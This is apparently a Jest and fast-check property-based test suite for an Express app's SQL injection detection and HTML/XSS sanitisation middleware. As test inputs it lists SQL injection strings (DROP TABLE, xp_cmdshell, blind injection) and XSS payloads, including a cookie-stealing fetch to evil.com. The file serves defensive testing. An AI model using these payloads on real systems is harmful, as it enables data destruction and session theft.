import { describe, it, expect, beforeEach } from '@jest/globals';
import * as fc from 'fast-check';
import { Request, Response, NextFunction } from 'express';
import {
  sanitizeRequest,
  sqlInjectionProtection,
  detectSqlInjection,
  sanitizeHtml
} from '../validation';
import { ValidationError } from '../errorHandler';

/**
 * Property-Based Tests for Security
 * Uses fast-check to generate many test cases and validate universal properties
 * Requirements: 36.6
 */

describe('Property-Based Tests - SQL Injection Prevention', () => {
  let mockResponse: Partial<Response>;
  let mockNext: jest.Mock<NextFunction>;

  beforeEach(() => {
    mockResponse = {};
    mockNext = jest.fn() as jest.Mock<NextFunction>;
  });

  /**
   * Property 29: SQL Injection Prevention
   * For any user input containing SQL injection patterns, the input should either be
   * sanitized by escaping special characters or rejected, and should never be executed as SQL.
   * 
   * **Validates: Requirements 36.6**
   */
  describe('Property 29: SQL Injection Prevention', () => {
    // Generator for SQL injection patterns
    const sqlInjectionArbitrary = fc.oneof(
      // UNION-based injection
      fc.constantFrom(
        "' UNION SELECT * FROM users--",
        "admin' UNION SELECT password FROM users WHERE '1'='1",
        "1 UNION ALL SELECT NULL, username, password FROM users",
        "' UNION SELECT table_name FROM information_schema.tables--"
      ),
      // OR-based injection
      fc.constantFrom(
        "' OR '1'='1",
        "admin' OR 1=1--",
        "' OR 'x'='x",
        "1' OR '1'='1' --",
        "' OR 1=1#"
      ),
      // AND-based injection
      fc.constantFrom(
        "' AND '1'='1",
        "admin' AND 1=1--",
        "1' AND 'a'='a"
      ),
      // Comment-based injection
      fc.constantFrom(
        "admin'--",
        "admin'#",
        "admin'/*",
        "'; DROP TABLE users;--",
        "1'; DELETE FROM students;#"
      ),
      // DROP TABLE attacks
      fc.constantFrom(
        "'; DROP TABLE users;--",
        "1; DROP TABLE students CASCADE;",
        "admin'; DROP DATABASE school;--"
      ),
      // INSERT/UPDATE/DELETE injection
      fc.constantFrom(
        "'; INSERT INTO users VALUES ('hacker', 'pass');--",
        "'; UPDATE users SET role='admin' WHERE id=1;--",
        "'; DELETE FROM students WHERE 1=1;--"
      ),
      // Stored procedure execution
      fc.constantFrom(
        "'; EXEC xp_cmdshell('dir');--",
        "admin'; EXECUTE sp_executesql N'SELECT * FROM users';--"
      ),
      // Time-based blind injection
      fc.constantFrom(
        "' OR SLEEP(5)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
      ),
      // Boolean-based blind injection
      fc.constantFrom(
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND SUBSTRING(password,1,1)='a'--"
      )
    );

    it('should detect all SQL injection patterns', () => {
      fc.assert(
        fc.property(sqlInjectionArbitrary, (maliciousInput) => {
          // Property: All SQL injection patterns should be detected
          const isDetected = detectSqlInjection(maliciousInput);
          
          // The function should detect the malicious pattern
          expect(isDetected).toBe(true);
          
          return isDetected === true;
        }),
        { numRuns: 100 }
      );
    });

    it('should block SQL injection in request body', () => {
      fc.assert(
        fc.property(
          sqlInjectionArbitrary,
          fc.string({ minLength: 1, maxLength: 50 }),
          (maliciousInput, fieldName) => {
            const mockRequest: Partial<Request> = {
              body: { [fieldName]: maliciousInput },
              query: {},
              params: {}
            };

            sqlInjectionProtection(mockRequest as Request, mockResponse as Response, mockNext);

            // Property: Middleware should call next with ValidationError
            expect(mockNext).toHaveBeenCalledWith(expect.any(ValidationError));
            
            const error = mockNext.mock.calls[0][0] as ValidationError;
            expect(error.message).toContain('Suspicious input detected');
            
            // Reset mock for next iteration
            mockNext.mockClear();
            
            return true;
          }
        ),
        { numRuns: 50 }
      );
    });

    it('should block SQL injection in query parameters', () => {
      fc.assert(
        fc.property(
          sqlInjectionArbitrary,
          fc.string({ minLength: 1, maxLength: 50 }),
          (maliciousInput, paramName) => {
            const mockRequest: Partial<Request> = {
              body: {},
              query: { [paramName]: maliciousInput },
              params: {}
            };

            sqlInjectionProtection(mockRequest as Request, mockResponse as Response, mockNext);

            // Property: Middleware should call next with ValidationError
            expect(mockNext).toHaveBeenCalledWith(expect.any(ValidationError));
            
            // Reset mock for next iteration
            mockNext.mockClear();
            
            return true;
          }
        ),
        { numRuns: 50 }
      );
    });

    it('should block SQL injection in nested objects', () => {
      fc.assert(
        fc.property(
          sqlInjectionArbitrary,
          (maliciousInput) => {
            const mockRequest: Partial<Request> = {
              body: {
                user: {
                  profile: {
                    bio: maliciousInput
                  }
                }
              },
              query: {},
              params: {}
            };

            sqlInjectionProtection(mockRequest as Request, mockResponse as Response, mockNext);

            // Property: Nested SQL injection should be detected
            expect(mockNext).toHaveBeenCalledWith(expect.any(ValidationError));
            
            // Reset mock for next iteration
            mockNext.mockClear();
            
            return true;
          }
        ),
        { numRuns: 50 }
      );
    });

    it('should block SQL injection in arrays', () => {
      fc.assert(
        fc.property(
          sqlInjectionArbitrary,
          fc.array(fc.string(), { minLength: 0, maxLength: 3 }),
          (maliciousInput, safeStrings) => {
            const mockRequest: Partial<Request> = {
              body: {
                items: [...safeStrings, maliciousInput]
              },
              query: {},
              params: {}
            };

            sqlInjectionProtection(mockRequest as Request, mockResponse as Response, mockNext);

            // Property: SQL injection in arrays should be detected
            expect(mockNext).toHaveBeenCalledWith(expect.any(ValidationError));
            
            // Reset mock for next iteration
            mockNext.mockClear();
            
            return true;
          }
        ),
        { numRuns: 50 }
      );
    });

    // Generator for safe inputs (should NOT be detected as SQL injection)
    const safeInputArbitrary = fc.oneof(
      fc.constantFrom(
        'john_doe',
        'john.doe@example.com',
        "John O'Brien", // Legitimate apostrophe
        'Class 10-A',
        '2081-10-15',
        'Normal text with numbers 123',
        'Search query with spaces',
        'Price: Rs. 100',
        'Address: 123 Main Street',
        'Phone: +977-1-4567890'
      ),
      fc.string({ minLength: 1, maxLength: 50 }).filter(s => !detectSqlInjection(s))
    );

    it('should allow safe inputs to pass through', () => {
      fc.assert(
        fc.property(
          safeInputArbitrary,
          (safeInput) => {
            const mockRequest: Partial<Request> = {
              body: { username: safeInput },
              query: {},
              params: {}
            };

            sqlInjectionProtection(mockRequest as Request, mockResponse as Response, mockNext);

            // Property: Safe inputs should pass through without error
            expect(mockNext).toHaveBeenCalledWith();
            expect(mockNext).not.toHaveBeenCalledWith(expect.any(ValidationError));
            
            // Reset mock for next iteration
            mockNext.mockClear();
            
            return true;
          }
        ),
        { numRuns: 100 }
      );
    });

    it('should handle mixed safe and malicious inputs correctly', () => {
      fc.assert(
        fc.property(
          safeInputArbitrary,
          sqlInjectionArbitrary,
          (safeInput, maliciousInput) => {
            const mockRequest: Partial<Request> = {
              body: {
                safeField: safeInput,
                maliciousField: maliciousInput
              },
              query: {},
              params: {}
            };

            sqlInjectionProtection(mockRequest as Request, mockResponse as Response, mockNext);

            // Property: Request with any malicious field should be blocked
            expect(mockNext).toHaveBeenCalledWith(expect.any(ValidationError));
            
            // Reset mock for next iteration
            mockNext.mockClear();
            
            return true;
          }
        ),
        { numRuns: 50 }
      );
    });
  });
});

describe('Property-Based Tests - XSS Prevention', () => {
  let mockResponse: Partial<Response>;
  let mockNext: jest.Mock<NextFunction>;

  beforeEach(() => {
    mockResponse = {};
    mockNext = jest.fn() as jest.Mock<NextFunction>;
  });

  /**
   * Property 30: XSS Prevention
   * For any user input containing HTML/JavaScript tags, the input should be sanitized
   * by encoding special characters before storage and display, preventing script execution.
   * 
   * **Validates: Requirements 36.6**
   */
  describe('Property 30: XSS Prevention', () => {
    // Generator for XSS attack patterns
    const xssAttackArbitrary = fc.oneof(
      // Script tags
      fc.constantFrom(
        '<script>alert("XSS")</script>',
        '<script>alert(document.cookie)</script>',
        '<script src="http://evil.com/xss.js"></script>',
        '<SCRIPT>alert("XSS")</SCRIPT>', // Case variation
        '<script>fetch("http://evil.com?cookie="+document.cookie)</script>'
      ),
      // Event handlers
      fc.constantFrom(
        '<img src="x" onerror="alert(1)">',
        '<body onload="alert(1)">',
        '<div onclick="alert(1)">Click</div>',
        '<input onfocus="alert(1)">',
        '<a onmouseover="alert(1)">Hover</a>',
        '<svg onload="alert(1)">',
        '<iframe onload="alert(1)"></iframe>'
      ),
      // JavaScript protocol
      fc.constantFrom(
        'javascript:alert("XSS")',
        'javascript:void(document.cookie)',
        '<a href="javascript:alert(1)">Click</a>'
      ),
      // Iframe injection
      fc.constantFrom(
        '<iframe src="http://evil.com"></iframe>',
        '<iframe src="javascript:alert(1)"></iframe>'
      ),
      // Object and embed tags
      fc.constantFrom(
        '<object data="malicious.swf"></object>',
        '<embed src="evil.swf">',
        '<object data="data:text/html,<script>alert(1)</script>"></object>'
      ),
      // Data URIs
      fc.constantFrom(
        '<img src="data:text/html,<script>alert(1)</script>">',
        '<a href="data:text/html,<script>alert(1)</script>">Click</a>'
      ),
      // SVG-based XSS
      fc.constantFrom(
        '<svg><script>alert(1)</script></svg>',
        '<svg onload="alert(1)"></svg>'
      ),
      // Style-based XSS
      fc.constantFrom(
        '<style>body{background:url("javascript:alert(1)")}</style>',
        '<div style="background:url(javascript:alert(1))">XSS</div>'
      )
    );

    it('should sanitize all XSS attack patterns', () => {
      fc.assert(
        fc.property(xssAttackArbitrary, (xssInput) => {
          const mockRequest: Partial<Request> = {
            body: { comment: xssInput },
            query: {},
            params: {}
          };

          sanitizeRequest(mockRequest as Request, mockResponse as Response, mockNext);

          // Property: XSS patterns should be removed or neutralized
          const sanitized = mockRequest.body.comment as string;
          
          // Check that dangerous patterns are removed
          expect(sanitized).not.toMatch(/<script[^>]*>/i);
          expect(sanitized).not.toMatch(/<\/script>/i);
          expect(sanitized).not.toMatch(/on\w+\s*=/i); // Event handlers
          expect(sanitized).not.toMatch(/<iframe[^>]*>/i);
          expect(sanitized).not.toMatch(/<object[^>]*>/i);
          expect(sanitized).not.toMatch(/<embed[^>]*>/i);
          
          // Reset mock for next iteration
          mockNext.mockClear();
          
          return true;
        }),
        { numRuns: 100 }
      );
    });

    it('should sanitize XSS in request body fields', () => {
      fc.assert(
        fc.property(
          xssAttackArbitrary,
          fc.string({ minLength: 1, maxLength: 50 }),
          (xssInput, fieldName) => {
            const mockRequest: Partial<Request> = {
              body: { [fieldName]: xssInput },
              query: {},
              params: {}
            };

            sanitizeRequest(mockRequest as Request, mockResponse as Response, mockNext);

            // Property: All XSS should be sanitized
            const sanitized = mockRequest.body[fieldName] as string;
            expect(sanitized).not.toMatch(/<script[^>]*>/i);
            expect(sanitized).not.toMatch(/on\w+\s*=/i);
            
            // Reset mock for next iteration
            mockNext.mockClear();
            
            return true;
          }
        ),
        { numRuns: 50 }
      );
    });

    it('should sanitize XSS in query parameters', () => {
      fc.assert(
        fc.property(
          xssAttackArbitrary,
          fc.string({ minLength: 1, maxLength: 50 }),
          (xssInput, paramName) => {
            const mockRequest: Partial<Request> = {
              body: {},
              query: { [paramName]: xssInput },
              params: {}
            };

            sanitizeRequest(mockRequest as Request, mockResponse as Response, mockNext);

            // Property: Query parameters should be sanitized
            const sanitized = (mockRequest.query as Record<string, unknown>)[paramName] as string;
            expect(sanitized).not.toMatch(/<script[^>]*>/i);
            expect(sanitized).not.toMatch(/on\w+\s*=/i);
            
            // Reset mock for next iteration
            mockNext.mockClear();
            
            return true;
          }
        ),
        { numRuns: 50 }
      );
    });

    it('should sanitize XSS in nested objects', () => {
      fc.assert(
        fc.property(
          xssAttackArbitrary,
          (xssInput) => {
            const mockRequest: Partial<Request> = {
              body: {
                user: {
                  profile: {
                    bio: xssInput
                  }
                }
              },
              query: {},
              params: {}
            };

            sanitizeRequest(mockRequest as Request, mockResponse as Response, mockNext);

            // Property: Nested XSS should be sanitized
            const sanitized = mockRequest.body.user.profile.bio as string;
            expect(sanitized).not.toMatch(/<script[^>]*>/i);
            expect(sanitized).not.toMatch(/on\w+\s*=/i);
            
            // Reset mock for next iteration
            mockNext.mockClear();
            
            return true;
          }
        ),
        { numRuns: 50 }
      );
    });

    it('should sanitize XSS in arrays', () => {
      fc.assert(
        fc.property(
          xssAttackArbitrary,
          fc.array(fc.string(), { minLength: 0, maxLength: 3 }),
          (xssInput, safeStrings) => {
            const mockRequest: Partial<Request> = {
              body: {
                comments: [...safeStrings, xssInput]
              },
              query: {},
              params: {}
            };

            sanitizeRequest(mockRequest as Request, mockResponse as Response, mockNext);

            // Property: XSS in arrays should be sanitized
            const lastComment = mockRequest.body.comments[mockRequest.body.comments.length - 1] as string;
            expect(lastComment).not.toMatch(/<script[^>]*>/i);
            expect(lastComment).not.toMatch(/on\w+\s*=/i);
            
            // Reset mock for next iteration
            mockNext.mockClear();
            
            return true;
          }
        ),
        { numRuns: 50 }
      );
    });

    // Generator for safe inputs
    const safeTextArbitrary = fc.oneof(
      fc.constantFrom(
        'Normal text',
        'Text with numbers 123',
        'Email: user@example.com',
        'Price: Rs. 100 & discount 10%',
        'Address: 123 Main Street',
        'Phone: +977-1-4567890',
        'Date: 2081-10-15'
      ),
      fc.string({ minLength: 1, maxLength: 100 }).filter(s => 
        !s.includes('<') && !s.includes('>') && !s.includes('javascript:')
      )
    );

    it('should preserve safe text content', () => {
      fc.assert(
        fc.property(
          safeTextArbitrary,
          (safeText) => {
            const mockRequest: Partial<Request> = {
              body: { content: safeText },
              query: {},
              params: {}
            };

            const originalContent = safeText;
            sanitizeRequest(mockRequest as Request, mockResponse as Response, mockNext);

            // Property: Safe text should be preserved (possibly trimmed)
            const sanitized = mockRequest.body.content as string;
            expect(sanitized).toBe(originalContent.trim());
            
            // Reset mock for next iteration
            mockNext.mockClear();
            
            return true;
          }
        ),
        { numRuns: 100 }
      );
    });

    it('should remove null bytes from any input', () => {
      fc.assert(
        fc.property(
          fc.string({ minLength: 1, maxLength: 50 }),
          (text) => {
            const inputWithNullByte = text + '\0' + 'extra';
            const mockRequest: Partial<Request> = {
              body: { filename: inputWithNullByte },
              query: {},
              params: {}
            };

            sanitizeRequest(mockRequest as Request, mockResponse as Response, mockNext);

            // Property: Null bytes should always be removed
            const sanitized = mockRequest.body.filename as string;
            expect(sanitized).not.toContain('\0');
            
            // Reset mock for next iteration
            mockNext.mockClear();
            
            return true;
          }
        ),
        { numRuns: 50 }
      );
    });

    it('should trim whitespace from all string inputs', () => {
      fc.assert(
        fc.property(
          fc.string({ minLength: 1, maxLength: 50 }).filter(s => 
            !s.includes('<') && !s.includes('>') && !s.includes('&')
          ),
          fc.nat({ max: 10 }),
          fc.nat({ max: 10 }),
          (text, leadingSpaces, trailingSpaces) => {
            const paddedText = ' '.repeat(leadingSpaces) + text + ' '.repeat(trailingSpaces);
            const mockRequest: Partial<Request> = {
              body: { field: paddedText },
              query: {},
              params: {}
            };

            sanitizeRequest(mockRequest as Request, mockResponse as Response, mockNext);

            // Property: Whitespace should be trimmed
            const sanitized = mockRequest.body.field as string;
            expect(sanitized).toBe(text.trim());
            
            // Reset mock for next iteration
            mockNext.mockClear();
            
            return true;
          }
        ),
        { numRuns: 50 }
      );
    });

    describe('sanitizeHtml function', () => {
      it('should allow whitelisted tags while removing dangerous content', () => {
        fc.assert(
          fc.property(
            fc.constantFrom('<p>', '<strong>', '<em>', '<br>', '<ul>', '<ol>', '<li>'),
            fc.string({ minLength: 1, maxLength: 50 }).filter(s => 
              !s.includes('<') && !s.includes('>') && !s.includes('&')
            ),
            xssAttackArbitrary,
            (safeTag, content, xssContent) => {
              const closingTag = safeTag.replace('<', '</');
              const html = `${safeTag}${content}${closingTag}${xssContent}`;
              const sanitized = sanitizeHtml(html);

              // Property: Safe tags should be preserved
              expect(sanitized).toContain(safeTag);
              
              // Property: Script tags should be removed
              expect(sanitized).not.toMatch(/<script[^>]*>/i);
              
              // Property: Dangerous tags should be encoded or removed
              // The xss library encodes dangerous content, so check it's not executable
              // If it contains event handlers, they should be encoded (not executable)
              if (sanitized.includes('onerror') || sanitized.includes('onclick') || sanitized.includes('onload')) {
                // If event handlers are present, they should be encoded (contain &quot; or &lt;)
                expect(sanitized).toMatch(/(&lt;|&gt;|&quot;)/);
              }
              
              return true;
            }
          ),
          { numRuns: 50 }
        );
      });

      it('should remove all tags when whitelist is empty', () => {
        fc.assert(
          fc.property(
            xssAttackArbitrary,
            (xssInput) => {
              const sanitized = sanitizeHtml(xssInput, []);

              // Property: All HTML tags should be removed
              expect(sanitized).not.toMatch(/<[^>]+>/);
              
              return true;
            }
          ),
          { numRuns: 50 }
        );
      });
    });
  });

  describe('Combined SQL Injection and XSS Prevention', () => {
    it('should handle inputs with both SQL injection and XSS patterns', () => {
      const combinedAttackArbitrary = fc.tuple(
        fc.constantFrom(
          "'; DROP TABLE users;--",
          "' OR '1'='1",
          "admin' UNION SELECT * FROM users--"
        ),
        fc.constantFrom(
          '<script>alert("XSS")</script>',
          '<img src=x onerror=alert(1)>',
          '<iframe src="http://evil.com"></iframe>'
        )
      ).map(([sql, xss]) => sql + xss);

      fc.assert(
        fc.property(
          combinedAttackArbitrary,
          (combinedAttack) => {
            const mockRequest: Partial<Request> = {
              body: { input: combinedAttack },
              query: {},
              params: {}
            };

            // First, SQL injection check should catch it
            sqlInjectionProtection(mockRequest as Request, mockResponse as Response, mockNext);

            // Property: Combined attacks should be blocked by SQL injection check
            expect(mockNext).toHaveBeenCalledWith(expect.any(ValidationError));
            
            // Reset mock for next iteration
            mockNext.mockClear();
            
            return true;
          }
        ),
        { numRuns: 50 }
      );
    });
  });
});
